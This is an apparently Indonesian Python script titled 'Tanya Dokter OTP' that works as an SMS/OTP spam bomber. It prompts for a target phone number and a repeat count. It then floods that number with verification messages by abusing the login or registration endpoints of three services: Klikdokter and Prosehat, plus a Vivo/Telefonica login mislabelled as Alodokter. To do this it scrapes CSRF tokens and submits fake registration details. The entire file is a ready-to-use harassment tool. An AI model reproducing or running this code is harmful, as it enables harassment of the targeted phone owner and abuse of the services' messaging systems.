
import requests,os,sys,time
from bs4 import BeautifulSoup as BS

class docter:
	def __init__(self):
		self.ses=requests.Session()

	def alodoc(self,num):
		self.ses.headers.update({'referer':'https://br.mobileconnect.telefonica.com/br/authrouter/authenticate?jwt=eyJraWQiOiJ0ZGFmLWFwaS1hdXRoc2VydmVyIiwiY29yciI6IkFVUy02YzhmZTk3Yi1iODhkLTQ2MWQtYmE3ZC0zODM0MWU2Y2QwYjAiLCJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..OInK0DnJfhbarb-6E_myRQ.PKzlw2vS_4xVWq1yGMP1yqt1dxohwby9Q2wWd79-a0ztpNlpef6oXEgaSS-8fCQDAb9d__AJ_9jEJEoH38-_PptnJrT7J-qIlcANG_8-STpk9qB6dBzVWYPkma4P_Nr53EB5jjaNXOOSKslFqlqr3BbNUgj-ODU7LU2-TjAsbUlMnOhDyOr05oAU3rPZ0NyPqZICCn9JgR7UkP_-oME_MWB3LQrSdYrSfNCCPYkWk1Y0uC8C0hGtIPycmRBFUpmOiHs0uWOEhew9TcmGXr7pKpTVOwCqBXwDdshHuTcukrEj5jA6_FOy5y_Z3GQwuI8REwHfSa6g4p_uiYh3AfVvHVJe26JwrmZhbRtacLvJCH5H86j_oEAYgbQTYxPXvmnNRo-uW6EBOXPTUA7cd76ay_wRqUbGY1unnok0yGeV9VBdHZE5xJ7mfIh5zzTNnpu9urYrgNAciUQxC0g1rocpHzgX7Y5wckigT5nSU8-fW75ARoZKPwnHq_meWhrtg9Mr.vNHdu8G9eQXTbKoc3rsZJCV5oZnDYINrt45tf1PgZZk'})
		req1=self.ses.get('https://br.mobileconnect.telefonica.com/br/authrouter/authenticate?jwt=eyJraWQiOiJ0ZGFmLWFwaS1hdXRoc2VydmVyIiwiY29yciI6IkFVUy02YzhmZTk3Yi1iODhkLTQ2MWQtYmE3ZC0zODM0MWU2Y2QwYjAiLCJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..OInK0DnJfhbarb-6E_myRQ.PKzlw2vS_4xVWq1yGMP1yqt1dxohwby9Q2wWd79-a0ztpNlpef6oXEgaSS-8fCQDAb9d__AJ_9jEJEoH38-_PptnJrT7J-qIlcANG_8-STpk9qB6dBzVWYPkma4P_Nr53EB5jjaNXOOSKslFqlqr3BbNUgj-ODU7LU2-TjAsbUlMnOhDyOr05oAU3rPZ0NyPqZICCn9JgR7UkP_-oME_MWB3LQrSdYrSfNCCPYkWk1Y0uC8C0hGtIPycmRBFUpmOiHs0uWOEhew9TcmGXr7pKpTVOwCqBXwDdshHuTcukrEj5jA6_FOy5y_Z3GQwuI8REwHfSa6g4p_uiYh3AfVvHVJe26JwrmZhbRtacLvJCH5H86j_oEAYgbQTYxPXvmnNRo-uW6EBOXPTUA7cd76ay_wRqUbGY1unnok0yGeV9VBdHZE5xJ7mfIh5zzTNnpu9urYrgNAciUQxC0g1rocpHzgX7Y5wckigT5nSU8-fW75ARoZKPwnHq_meWhrtg9Mr.vNHdu8G9eQXTbKoc3rsZJCV5oZnDYINrt45tf1PgZZk')
		bs1=BS(req1.text,'html.parser')
		token=bs1.find('meta',{'name':'csrf-token'})['content']
#		print(token)

		head={
			'user-agent':'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type':'application/json',
			'referer':'https://br.mobileconnect.telefonica.com/br/authrouter/authenticate?jwt=eyJraWQiOiJ0ZGFmLWFwaS1hdXRoc2VydmVyIiwiY29yciI6IkFVUy02YzhmZTk3Yi1iODhkLTQ2MWQtYmE3ZC0zODM0MWU2Y2QwYjAiLCJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..OInK0DnJfhbarb-6E_myRQ.PKzlw2vS_4xVWq1yGMP1yqt1dxohwby9Q2wWd79-a0ztpNlpef6oXEgaSS-8fCQDAb9d__AJ_9jEJEoH38-_PptnJrT7J-qIlcANG_8-STpk9qB6dBzVWYPkma4P_Nr53EB5jjaNXOOSKslFqlqr3BbNUgj-ODU7LU2-TjAsbUlMnOhDyOr05oAU3rPZ0NyPqZICCn9JgR7UkP_-oME_MWB3LQrSdYrSfNCCPYkWk1Y0uC8C0hGtIPycmRBFUpmOiHs0uWOEhew9TcmGXr7pKpTVOwCqBXwDdshHuTcukrEj5jA6_FOy5y_Z3GQwuI8REwHfSa6g4p_uiYh3AfVvHVJe26JwrmZhbRtacLvJCH5H86j_oEAYgbQTYxPXvmnNRo-uW6EBOXPTUA7cd76ay_wRqUbGY1unnok0yGeV9VBdHZE5xJ7mfIh5zzTNnpu9urYrgNAciUQxC0g1rocpHzgX7Y5wckigT5nSU8-fW75ARoZKPwnHq_meWhrtg9Mr.vNHdu8G9eQXTbKoc3rsZJCV5oZnDYINrt45tf1PgZZk',
			'accept':'application/json',
			'origin':'https://login.vivo.com.br/',
			'x-csrf-token':token
		}
		req2=self.ses.post('https://login.vivo.com.br/loginmarca/appmanager/marca/publico?acesso=paravoce',headers=head,json={"user":{"phone":num}})
#		print(req2.json())
		if req2.json()['status'] == 'success':
			print("[•] Berhasil")
		else:
			print("[-] Gagal")

	def klikdok(self,num):
		req1=self.ses.get('https://m.klikdokter.com/users/create')
		bs=BS(req1.text,'html.parser')
		token=bs.find('input',{'name':'_token'})['value']
#		print(token)

		head={
			'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Origin': 'https://m.klikdokter.com',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Referer': 'https://m.klikdokter.com/users/create?back-to=',
		}
		ata={
			'_token':token,
			'full_name':'BambangSubianto',
			'email':'Hsjakaj@jskaka.com',
			'phone':num,
			'back-to':'',
			'submit':'Daftar',
		}

		req2=self.ses.post('https://m.klikdokter.com/users/check',headers=head,data=ata)
#		print(req2.url)
		if "sessions/auth?user=" in req2.url:
			print("[•] Berhasil")
		else:
			print("[-] Gagal")

	def prosehat(self,num):
		head={
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'origin': 'https://www.prosehat.com',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'referer': 'https://www.prosehat.com/akun',
		}
		ata={'phone_or_email':num,'action':'ajaxverificationsend'}

		req=requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php',data=ata,headers=head)
#		print(req.text)
		if "token" in req.text:
			print("[•] Berhasil")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()
		else:
			print(f"[-] Gagal {req.text}")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()

while True:
	try:
		os.system('clear')
		print("""
		[ Tanya Dokter OTP ]
		 - By Kang-Newbie -

[ Spam List ]
1. Alodokter.com
2. Klikdokter.com
3. Prosehat.com
	""")
		pil=int(input("> Pilih: "))
		print("="*25)
		num=input("[?] Nomor Target: ")
		lop=int(input("[?] Looping: "))
		print()

		main=docter()
		if pil == 1:
			for i in range(lop):
				main.alodoc(num)
		elif pil == 2:
			for i in range(lop):
				main.klikdok(num)
		elif pil == 3:
			for i in range(lop):
				main.prosehat(num)
		else:
			print("?: Anda Buta!?")

		lgi=input("\n[?] Coba lagi (Y/n) ")
		if lgi.lower() == 'n':
			sys.exit('GOODBYE :*')
	except Exception as Err:
		sys.exit(Err)
